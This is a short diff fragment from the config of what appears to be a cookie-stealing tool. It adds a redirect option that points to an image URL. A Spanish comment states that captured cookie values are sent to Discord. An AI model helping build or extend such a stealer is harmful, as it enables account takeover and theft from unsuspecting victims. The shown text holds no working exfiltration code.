@@ -40,6 +40,12 @@ config = {
         "message": "Here's the information that you ask for.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
+        # REDIRECTION #
+    "redirect": {
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://i.imgur.com/UTwSor8.jpeg" # Link to the webpage to redirect to 
+    },
+
 
 
 # Si encontramos el valor de la cookie, lo enviamos a Discord
